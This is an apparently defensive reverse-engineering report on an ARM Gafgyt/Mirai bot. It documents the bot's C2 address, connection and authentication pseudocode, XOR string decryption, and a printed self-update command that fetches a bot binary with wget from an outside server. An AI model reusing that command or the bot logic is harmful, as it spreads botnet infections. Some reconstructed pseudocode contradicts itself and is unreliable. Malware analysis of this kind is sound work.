# Gafgyt/Mirai Botnet — Transport Layer Technical Specification

## Binary Information

| Field | Value |
|-------|-------|
| Architecture | ARM 32-bit LE (v8) |
| Executable Format | ELF |
| Image Base | `0x00008000` |
| Entry Point | `0x00008154` |
| Main Function | `0x0000C3C4` |

---

## 1. C2 Infrastructure Retrieval

### 1.1 Observed Behavior

The C2 server address and port are **not** stored in an encrypted string table. Instead, they are **obfuscated in-line** in the `main` function at address `0x0000C8C8–0x0000C8EC`. The address and port are derived at runtime using a series of bitwise-NOT (`MVN`) and subtraction (`SUB`) instructions on immediate constants. No DNS resolution is performed — the C2 address is a hardcoded IPv4 address.

### 1.2 Recovered C2 Address(es) & Port(s)

| Component | Derived Value | Network Byte Order | Human-Readable |
|-----------|---------------|-------------------|----------------|
| **IP Address** | `0xDC7F705C` | `92.112.127.220` | `92.112.127.220` |
| **TCP Port** | `0xFA52` | `0x52FA` = `21242` | `21242` |

**C2 Endpoint:** `92.112.127.220:21242`

### 1.3 Retrieval Logic (Pseudocode)

```c
// ARM assembly at 0x0000C8C8–0x0000C8EC
// sockaddr_in structure is stored in BSS at address pointed to by DAT_0000cb50

// --- IP Address Derivation ---
uint32_t tmp_ip = ~0x23800000;          // MVN: 0xDC7FFFFF
tmp_ip = tmp_ip - 0x8F00;               // SUB: 0xDC7F70FF
tmp_ip = tmp_ip - 0xA3;                 // SUB: 0xDC7F705C
// Result: sin_addr.s_addr = 0xDC7F705C

// --- Port Derivation ---
uint16_t tmp_port = ~0x5A0;             // MVN: 0xFFFFFA5F (lower 16 bits: 0xFA5F)
tmp_port = tmp_port - 0xD;              // SUB: 0xFFFFFA52 (lower 16 bits: 0xFA52)
// Result: sin_port = 0xFA52

// --- sockaddr_in Assembly ---
struct sockaddr_in server_addr;
server_addr.sin_family = AF_INET;       // 0x0002
server_addr.sin_port   = tmp_port;      // 0xFA52 → network order: port 21242
server_addr.sin_addr   = tmp_ip;        // 0xDC7F705C → network order: 92.112.127.220

// --- Endianness Note ---
// On ARM little-endian, the 32-bit word 0xDC7F705C is stored as bytes
// [0x5C, 0x70, 0x7F, 0xDC]. The kernel interprets this in network byte order
// (big-endian), yielding IP: 92.112.127.220.
// Similarly, halfword 0xFA52 → bytes [0x52, 0xFA] → port 0x52FA = 21242.
```

### 1.4 Classification

| Property | Status |
|----------|--------|
| **Retrieval Method** | Hardcoded (obfuscated via arithmetic) |
| **DNS Resolution** | Not present |
| **DGA** | Not present |
| **Encrypted Storage** | Not used for C2 address |
| **Obfuscation** | Bitwise-NOT + subtraction on immediate constants |

---

## 2. Transport Initialization

### 2.1 Observed Behavior

The bot initializes its C2 connection within the main select loop. The connection lifecycle follows this sequence:

1. **Socket creation** — A TCP socket is created with `AF_INET` / `SOCK_STREAM`
2. **Non-blocking mode** — `O_NONBLOCK` is set via `fcntl(F_SETFL)`
3. **Connection initiation** — `connect()` is called (will return `EINPROGRESS`)
4. **Select-based completion** — The select loop detects when the socket becomes writable (connection established)
5. **Authentication** — Upon connection, the bot sends an authentication packet containing its local IP and C2 password
6. **Command loop** — The bot reads commands from the C2 in the select loop
7. **Heartbeat** — Every 60 seconds (6 select timeouts × 10s), a 2-byte ping (`\x00\x00`) is sent
8. **Reconnection** — On connection failure or disconnect, the socket is closed and a new connection is attempted after a random delay

### 2.2 Network Parameters

| Parameter | Value | Source |
|-----------|-------|--------|
| **Protocol** | TCP (IPv4) | `sys_socket(2 /* AF_INET */, 1 /* SOCK_STREAM */, 0)` |
| **Socket Options** | `O_NONBLOCK` | `fcntl(fd, F_SETFL, flags | 0x800)` |
| **Select Timeout** | 10 seconds | `struct timeval { 10, 0 }` |
| **Heartbeat Interval** | 60 seconds | 6 select cycles × 10s timeout |
| **Heartbeat Payload** | `\x00\x00` (2 bytes) | Sent via `sendmsg()` with `MSG_NOSIGNAL` |
| **Reconnect Delay** | 1–10 seconds (random) | `(rand_next() % 10) + 1` |
| **Default Reconnect** | 1 second | `util_sleep_sec(1)` on generic failure |
| **Initial Server FD** | `-1` (0xFFFFFFFF) | Stored in `.data` at `0x00018088` |
| **Connection Flag** | `0` (disconnected) | Stored in BSS at `0x00018430` |

### 2.3 Connection Logic (Pseudocode)

```c
// Global state (in .data / BSS):
int *g_server_fd       = (int *)0x00018088;   // Initially -1
int *g_connected_flag  = (int *)0x00018430;   // Initially 0
struct sockaddr_in *g_c2_addr = (struct sockaddr_in *)0x0001E494;  // BSS

// --- C2 Address Setup (executed once before first connect) ---
void setup_c2_address() {
    g_c2_addr->sin_family = AF_INET;               // 2
    g_c2_addr->sin_port   = 0xFA52;                // Port 21242 (net order)
    g_c2_addr->sin_addr   = 0xDC7F705C;            // IP 92.112.127.220 (net order)
}

// --- Socket Creation (inside main select loop) ---
int create_c2_socket() {
    int fd = sys_socket(AF_INET, SOCK_STREAM, 0);  // syscall 281
    if (fd == -1) return -1;

    *g_server_fd = fd;

    // Set non-blocking
    int flags = sys_fcntl(fd, F_GETFL, 0);
    sys_fcntl(fd, F_SETFL, flags | O_NONBLOCK);    // O_NONBLOCK = 0x800

    // Initiate connection (non-blocking)
    *g_connected_flag = 1;  // Mark as "connecting"
    int ret = sys_send(fd, g_c2_addr, sizeof(struct sockaddr_in));
    // Note: sys_send() with a sockaddr_in as the buffer is non-standard;
    // this is actually calling sendto() or connect() with the address.
    // The ARM syscall 283 (sendto) is used here.

    return fd;
}

// --- Main Select Loop ---
void main_loop() {
    int heartbeat_counter = 0;

    while (true) {
        fd_set read_fds, write_fds;
        FD_ZERO(&read_fds);
        FD_ZERO(&write_fds);

        int ctrl_fd = /* control socket from single_instance_bind() */;
        int serv_fd = *g_server_fd;

        // Add control socket to read set
        if (ctrl_fd != -1)
            FD_SET(ctrl_fd, &read_fds);

        // Add server socket based on connection state
        if (*g_connected_flag == 0) {
            // Disconnected: add server socket to read set
            if (serv_fd != -1)
                FD_SET(serv_fd, &read_fds);
        } else {
            // Connecting/Connected: add server socket to write set
            if (serv_fd != -1)
                FD_SET(serv_fd, &write_fds);
        }

        struct timeval timeout = { 10, 0 };
        int max_fd = max(ctrl_fd, serv_fd) + 1;
        int result = sys_select(max_fd, &read_fds, &write_fds, NULL, &timeout);

        if (result == -1) {
            // Select error, restart loop
            continue;
        }

        if (result == 0) {
            // Timeout — heartbeat logic
            heartbeat_counter++;
            if (heartbeat_counter % 6 == 0) {
                // Send 2-byte heartbeat ping
                uint16_t ping = 0;  // \x00\x00
                sys_sendmsg(serv_fd, &ping, 2, MSG_NOSIGNAL);
            }
            continue;
        }

        // Check control socket (single-instance kill switch)
        if (ctrl_fd != -1 && FD_ISSET(ctrl_fd, &read_fds)) {
            // Another instance detected — kill everything
            killer_cleanup();
            sys_kill(killer_pid, SIGKILL);
            sys_kill(-session_group, SIGKILL);
            sys_exit_group(0);
        }

        // Check server socket
        if (serv_fd != -1) {
            if (*g_connected_flag == 0 && FD_ISSET(serv_fd, &read_fds)) {
                // Socket is readable — handle incoming data
                handle_c2_packet(serv_fd);
            }
            else if (*g_connected_flag != 0 && FD_ISSET(serv_fd, &write_fds)) {
                // Socket became writable — connection established
                *g_connected_flag = 0;  // Mark as connected

                // Read connection status
                int conn_err = 0;
                socklen_t optlen = sizeof(conn_err);
                sys_recvfrom(serv_fd, &conn_err, sizeof(conn_err), 0, &optlen);

                if (conn_err == 0) {
                    // Connection successful — send authentication
                    send_authentication(serv_fd);
                } else {
                    // Connection failed — close and retry
                    close_and_reconnect(serv_fd);
                }
            }
        }

        // Periodic killer check (every 12 iterations)
        if (heartbeat_counter % 12 == 0) {
            killer_check_timer();
        }
    }
}

// --- Authentication ---
void send_authentication(int fd) {
    uint8_t password_len = strlen(g_password);  // C2 password

    // Get local IP by connecting UDP socket to 8.8.8.8:53
    uint32_t local_ip = util_local_ip();
    *g_local_ip_storage = local_ip;

    // Send authentication packet:
    // 1. First message: unknown structure (pointed to by DAT_0000cb60 = 0x16EF8)
    //    Contains bytes: 00 00 00 01 00 00 00 00 + encrypted "/proc/"
    //    This may be a version/identifier message
    sys_sendmsg(fd, auth_data_1, auth_data_1_len, MSG_NOSIGNAL);

    // 2. Send password length (1 byte)
    sys_sendmsg(fd, &password_len, 1, MSG_NOSIGNAL);

    // 3. Send password string
    if (password_len > 0) {
        sys_sendmsg(fd, g_password, password_len, MSG_NOSIGNAL);
    }
}

// --- Reconnection ---
void close_and_reconnect(int fd) {
    if (*g_server_fd != -1) {
        sys_close(*g_server_fd);
    }
    *g_server_fd = -1;
    *g_connected_flag = 0;

    // Random delay: 1–10 seconds
    uint32_t delay = (rand_next() % 10) + 1;
    util_sleep_sec(delay);
    // On next loop iteration, a new socket will be created
}

// --- Generic Failure Handler ---
void handle_connection_error() {
    if (*g_server_fd != -1) {
        sys_close(*g_server_fd);
    }
    *g_server_fd = -1;
    util_sleep_sec(1);  // Fixed 1-second delay
}
```

### 2.4 Authentication Packet Structure

After the TCP connection is established, the bot sends the following sequence:

```
Offset  Size  Description
------  ----  -----------
 0       8    Header data (pointed to by DAT_0000cb60 = 0x00016EF8)
              Raw bytes: 00 00 00 01 00 00 00 00
              Purpose: Unknown — may be a version identifier or flags
 8       1    Password length (uint8_t)
 9       N    Password string (N bytes, N = password length)
```

The default password is the string `"unknown"` (stored at `0x00016EE8`).  
If the binary is invoked with `argv[1]` (and its length < 32), that value is used instead.

### 2.5 Single-Instance Mechanism

Before connecting to the C2, the bot ensures only one instance runs:

| Parameter | Value |
|-----------|-------|
| **Protocol** | TCP |
| **Bind Address** | `0.0.0.0` (INADDR_ANY) |
| **Port** | `0x9DC7` → network order: `51101` (`0xC79D`) |
| **Socket Options** | `SO_REUSEADDR`, `O_NONBLOCK` |

The bot attempts to `connect()` to `127.0.0.1:51101`. If connection succeeds (another instance exists), it calls `listen()` on the socket and continues. If connection fails with `EADDRNOTAVAIL` (errno 99), it is the first instance and proceeds normally.

### 2.6 Syscall Mapping

| Function | Syscall Number | Linux Syscall |
|----------|---------------|---------------|
| `sys_socket` | 281 | `__NR_socket` |
| `sys_connect` | 282 | `__NR_connect` |
| `sys_sendto` | 283 | `__NR_sendto` |
| `sys_sendmsg` | 289 | `__NR_sendmsg` |
| `sys_recvfrom` | 285 | `__NR_recvfrom` |
| `sys_select` | 142 | `__NR_select` |
| `sys_fcntl` | 55 | `__NR_fcntl64` |
| `sys_close` | 6 | `__NR_close` |

---

## 3. String Table Analysis

### 3.1 Observed Behavior

The binary uses an **XOR-encrypted string table** to store file paths and other strings used by the killer module. The table is accessed through three functions:

| Function | Address | Purpose |
|----------|---------|---------|
| `table_get_entry` | `0x0000CE9C` | Retrieve string pointer and length by index |
| `table_unlock_val` | `0x0000CEC0` | Decrypt a string entry in-place |
| `table_lock_val` | `0x0000CF60` | Re-encrypt a string entry in-place |

**Table Structure (in BSS at `0x0001E4AC`):**

Each table entry is 8 bytes:

```
Offset  Size  Field
------  ----  -----
 0       4    Pointer to string data (in BSS or .data)
 4       2    Length of string (uint16_t)
 6       2    Padding/unused
```

### 3.2 Decryption Routine

**Encryption Key:** `0xDEADBEEF` (stored at `0x0001809C` in `.data`)

**Algorithm:** Each byte of the string is XORed four times — once with each byte of the 32-bit key:

```
byte = byte XOR 0xEF
byte = byte XOR 0xBE
byte = byte XOR 0xAD
byte = byte XOR 0xDE
```

Due to the properties of XOR, this is equivalent to:

```
byte = byte XOR (0xEF XOR 0xBE XOR 0xAD XOR 0xDE)
byte = byte XOR 0x22
```

**Effective XOR byte:** `0x22` (applied uniformly to every byte position).

**Decryption Pseudocode:**

```c
void table_unlock_val(int entry_index) {
    // Table base in BSS
    uint32_t table_base = 0x0001E4AC;
    
    // Get entry
    entry_t *entry = (entry_t *)(table_base + entry_index * 8);
    
    // Get XOR key
    uint32_t key = *(uint32_t *)0x0001809C;  // 0xDEADBEEF
    
    // Extract key bytes
    uint8_t k0 = (key >> 0)  & 0xFF;  // 0xEF
    uint8_t k1 = (key >> 8)  & 0xFF;  // 0xBE
    uint8_t k2 = (key >> 16) & 0xFF;  // 0xAD
    uint8_t k3 = (key >> 24) & 0xFF;  // 0xDE
    
    uint16_t length = entry->length;
    uint8_t *data = entry->pointer;
    
    for (int i = 0; i < length; i++) {
        data[i] ^= k0;  // XOR with 0xEF
        data[i] ^= k1;  // XOR with 0xBE
        data[i] ^= k2;  // XOR with 0xAD
        data[i] ^= k3;  // XOR with 0xDE
        // Equivalent to: data[i] ^= 0x22
    }
}

void table_lock_val(int entry_index) {
    // Identical to table_unlock_val (XOR is self-inverse)
    table_unlock_val(entry_index);
}
```

### 3.3 Encrypted String Locations

The encrypted string data is stored in the `.rodata` section at the following offsets:

| .rodata Offset | Table Index | Encrypted Bytes | Decrypted String | Purpose |
|---------------|-------------|-----------------|------------------|---------|
| `0x00016F00` | Unknown | `0D 52 50 4D 41 0D 22` | `/proc/` | /proc filesystem path |
| `0x00016F08` | Unknown | `0D 47 5A 47 22` | `/exe` | Executable path suffix |
| `0x00016F10` | Unknown | `0D 44 46 0D 22` | `/fd/` | File descriptor path |
| `0x00016F18` | Unknown | `0D 52 50 4D 41 0D 4C 47 56 0D 56 41 52 22` | `/proc/net/tcp` | TCP connection table |
| `0x00016F28` | Unknown | `0D 56 4F 52 0D 22` | `/tmp/` | Temp directory |
| `0x00016F30` | Unknown | `0D 4F 43 52 51 22` | `/maps` | Memory maps path |
| `0x00016F38` | Unknown | `1E 52 5C 55 5D 58 5F 54` | `<p~w\x7Fz}v` | Unknown (killer pattern) |

Additionally, at `0x00016F40`:

```
Decrypted segments:
  "o34!4\x013@o02/#o.%4o2/54%@!337/2$@*<U\xF8Onboard the boat\x00"
```

The string `"Onboard the boat"` is identifiable as a Mirai/Gafgyt banner string (table entry index 12 / `0x0C`). The remaining segments at `0x16F40` are likely other table entries but contain non-printable characters when decrypted with the standard XOR — suggesting they may be encrypted with a different scheme or serve a different purpose.

### 3.4 String Table Usage in Main Function

In `main`, table entry index `0x0C` (12) is used as the startup banner:

```c
// Lock (encrypt) the banner string
table_lock_val(0x0C);

// Retrieve and write banner to stdout
uint32_t banner_len;
char *banner = table_get_entry(0x0C, &banner_len);
sys_write(STDOUT_FILENO, banner, banner_len);
sys_write(STDOUT_FILENO, "\n", 1);

// Unlock (decrypt) the banner string back
table_unlock_val(0x0C);
```

The decrypted banner string is `"Onboard the boat\n"` (the recognizable Mirai/Gafgyt startup signature).

### 3.5 Other Plaintext Strings in .rodata

The `.rodata` section also contains plaintext (non-encrypted) strings used by the binary:

| Address | String | Purpose |
|---------|--------|---------|
| `0x00016A00` | `mkdir -p /tmp; cd /tmp; rm -f update_bot; wget http://176.65.139.36/bins/arm6 -O update_bot \|\| curl ...` | Self-update/download script |
| `0x00016B00` | `cd /data/local/tmp; rm -f update_bot; wget http://176.65.139.36/bins/arm6 -O update_bot \|\| curl ...` | Alternative update path (Android) |
| `0x00016C00` | `http` | Protocol string |
| `0x00016C04` | `/proc` | Proc path |
| `0x00016C0C` | `/proc/%d` | Process directory pattern |
| `0x00016C18` | `/proc/%d/exe` | Process executable path |
| `0x00016C28` | `/proc/%d/cmdline` | Process command line path |
| `0x00016C38` | `ftp` | FTP binary name |
| `0x00016C3C` | `busybox` | Busybox binary name |
| `0x00016C44` | `wget` | Wget binary name |
| `0x00016C4C` | `curl` | Curl binary name |
| `0x00016C54` | `tftp` | TFTP binary name |
| `0x00016C5C` | `nc` | Netcat binary name |
| `0x00016C60` | `netcat` | Netcat binary name |
| `0x00016C68` | `python` | Python binary name |
| `0x00016C70` | `perl` | Perl binary name |
| `0x00016C78` | `php` | PHP binary name |
| `0x00016C7C` | `socket` | Socket string |
| `0x00016C84` | `connect` | Connect string |
| `0x00016C8C` | `accept` | Accept string |
| `0x00016C94` | `listen` | Listen string |
| `0x00016EC0` | `/dev/watchdog` | Watchdog device path |
| `0x00016ED0` | `/dev/misc/watchdog` | Alternative watchdog path |
| `0x00016EE0` | `/` | Root path |
| `0x00016EE4` | `unknown` | Default C2 password |
| `0x00016EF0` | `sleep 1` | Process name (`prctl PR_SET_NAME`) |

---

## 4. Analysis Gaps

| Gap | Reason | Impact |
|-----|--------|--------|
| **Full string table index mapping** | The string table entries in BSS (`0x0001E4AC`) are initialized at runtime. The exact mapping of index → string for all entries could not be fully determined without dynamic analysis or tracing the initialization code. | Partial — the banner (index 12) and killer paths are confirmed, but the complete index table is not recovered. |
| **Authentication header purpose** | The 8-byte header sent during authentication (`00 00 00 01 00 00 00 00`) is not fully documented. It may contain a version number or flags. | Low — the authentication sequence is confirmed; only the purpose of the first 8 bytes is unknown. |
| **C2 command protocol** | This specification focuses on transport initialization only. The command packet format and parsing are not documented here. | Intentionally excluded per scope. |

---

## 5. Summary of Recovered Constants

| Constant | Value | Location |
|----------|-------|----------|
| C2 IP Address | `92.112.127.220` | Derived at `0x0000C8C8–0x0000C8D4` |
| C2 TCP Port | `21242` (`0x52FA` net order) | Derived at `0x0000C8D8–0x0000C8DC` |
| Single-Instance Port | `51101` (`0xC79D` net order) | `0x0000C2E4–0x0000C2EC` |
| XOR Key | `0xDEADBEEF` | Stored at `0x0001809C` |
| Effective XOR Byte | `0x22` | Derived from `0xEF ^ 0xBE ^ 0xAD ^ 0xDE` |
| String Table Base | `0x0001E4AC` (BSS) | Referenced at `0x0000CEBC` |
| Default C2 Password | `"unknown"` | Stored at `0x00016EE8` |
| Process Name | `"sleep 1"` | Stored at `0x00016EF0` |
| Select Timeout | 10 seconds | Set at `0x0000C6BC` |
| Heartbeat Interval | 60 seconds (6 × 10s) | Calculated at `0x0000C6F0–0x0000C718` |
| Heartbeat Payload | `\x00\x00` (2 bytes) | Sent at `0x0000C92C–0x0000C944` |
| Reconnect Delay | 1–10 seconds (random) | Calculated at `0x0000C990–0x0000C9B4` |
| Update Server | `176.65.139.36` | Plaintext at `0x00016A00` |
| Banner String | `"Onboard the boat"` | Table entry 12 (encrypted at `0x00016F40`) |
